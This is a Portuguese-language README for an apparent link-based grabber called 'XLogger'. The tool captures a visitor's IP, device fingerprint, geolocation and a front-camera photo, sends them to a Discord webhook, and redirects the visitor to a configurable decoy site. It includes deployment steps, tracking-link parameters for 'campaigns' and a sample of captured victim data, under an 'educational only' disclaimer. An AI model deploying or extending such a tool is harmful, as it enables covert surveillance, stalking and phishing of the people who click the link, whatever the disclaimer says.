# 📸 XLogger OSINT Link Collector

> Ferramenta educacional para coleta de dados via link – captura IP, fingerprint, localização e câmera (se autorizado) e envia para Discord.

---

## ⚠️ AVISO LEGAL

Esta ferramenta foi criada **exclusivamente para fins educacionais**, treinamentos controlados de OSINT e conscientização sobre riscos de engenharia social. **Jamais utilize em terceiros sem consentimento explícito**. Uso indevido pode violar leis locais.

---

## ✅ Funcionalidades

- 📡 Coleta IP público via API (ipify)
- 🧠 Detecta sistema, navegador, tipo de dispositivo
- 🌍 Solicita geolocalização via navegador (HTML5 Geolocation API)
- 📷 Solicita acesso à câmera frontal (captura 1 frame JPEG)
- 📤 Envia todos os dados para um canal Discord via Webhook
- 🔀 Redireciona o usuário para uma URL final configurável
- 🎯 Suporta parâmetros dinâmicos via querystring (`?r=`, `&geo=`, `&cam=`, etc.)

---

## 🚀 Começando

### 1. Clone ou baixe o repositório
```bash
git clone https://github.com/marcostolosa/xlogger.git
cd xlogger
```

### 2. Configure seu webhook Discord
1. Acesse seu servidor Discord
2. Vá em **Configurações > Integrações > Webhooks**
3. Crie um webhook e copie o URL
4. Cole em `osint-config.js` ou direto no `index.html`:

```js
window.OSINT_CONFIG = {
  webhookUrl: "https://discord.com/api/webhooks/SEU_WEBHOOK",
  ...
}
```

### 3. Faça o deploy (escolha uma das opções)

#### Firebase Hosting:
```bash
npm install -g firebase-tools
firebase login
firebase init hosting
# Copie arquivos para pasta "public/"
firebase deploy
```

#### GitHub Pages:
- Faça push do projeto em um repositório
- Ative Pages na branch `main`, pasta `/root`

---

## 📌 Parâmetros de Link (Tracking via Query)

| Parâmetro | Exemplo                         | Função                              |
|----------|----------------------------------|-------------------------------------|
| `r`      | `?r=https://alvo.com`            | Redireciona após coleta             |
| `cam`    | `&cam=1` ou `0`                  | Força ou desativa câmera            |
| `geo`    | `&geo=1` ou `0`                  | Força ou desativa localização       |
| `delay`  | `&delay=2000`                    | Tempo (ms) até redirecionamento     |
| `debug`  | `&debug=1`                       | Exibe logs na tela                  |
| `camp`   | `&camp=simulacaoX`               | Rastreia campanha (custom)          |

Exemplo:
```text
https://xlogger.io?r=https://youtube.com&cam=1&geo=1&camp=simulacaoA
```

---

## 📁 Estrutura do Projeto

```
xlogger-osint/
├── index.html           # Página principal
├── script.js            # Lógica de coleta e envio
├── osint-config.js      # Config externa (opcional)
└── README.md            # Este arquivo
```

---

## 📸 Demonstração Esperada (Discord)

```
**IP:** 201.21.54.12
**User-Agent:** Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X)...
**Localização:** -23.5, -46.6 (±120m)
**Hora:** 2025-07-17 08:10:13
[imagem da câmera anexada]
```

---

## 🔐 Boas Práticas e Segurança
- ✅ Use **HTTPS** sempre (necessário para geolocalização e câmera)
- ✅ Rode em **ambientes controlados** (ex: laboratórios de OSINT)
- ✅ Armazene o webhook fora do código público (ou use backend proxy)
- ⚠️ **NUNCA use contra terceiros** sem autorização legal

---

Referências:
- [MDN Web Docs – getUserMedia](https://developer.mozilla.org/docs/Web/API/MediaDevices/getUserMedia)
- [MDN – Geolocation API](https://developer.mozilla.org/docs/Web/API/Geolocation_API)
- [Discord Webhooks Guide](https://birdie0.github.io/discord-webhooks-guide/structure/file.html)
- [ipify.org](https://www.ipify.org)

---

## 📬 Licença
MIT – uso educacional apenas. Responsabilidade total de quem executa em campo real.
